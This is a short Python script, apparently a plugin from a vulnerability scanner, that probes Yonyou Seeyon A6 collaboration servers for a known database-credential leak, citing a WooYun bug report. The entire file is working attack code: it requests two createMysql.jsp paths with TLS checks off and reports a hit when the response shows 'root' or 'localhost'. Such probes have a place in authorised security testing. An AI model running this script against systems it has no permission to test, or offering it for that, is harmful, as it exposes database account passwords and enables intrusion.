#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友致远A6协同系统数据库账号泄露
referer: http://www.wooyun.org/bugs/wooyun-2010-0110538
author: Lucifer
description: 用友致远A6 /yyoa/createMysql.jsp,/yyoa/ext/createMysql.jsp存在数据库账号密码泄露。
'''
import sys
import requests
import warnings
def run(url):
        result = ['用友致远A6协同系统数据库账号泄露','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/yyoa/createMysql.jsp",
                    "/yyoa/ext/createMysql.jsp"]
        try:
            for payload in payloads:
                vulnurl = url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"root" in req.text or r"localhost" in req.text:
                    result[2]=  '存在'
                    result[1] = vulnurl
                else:
                    result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])

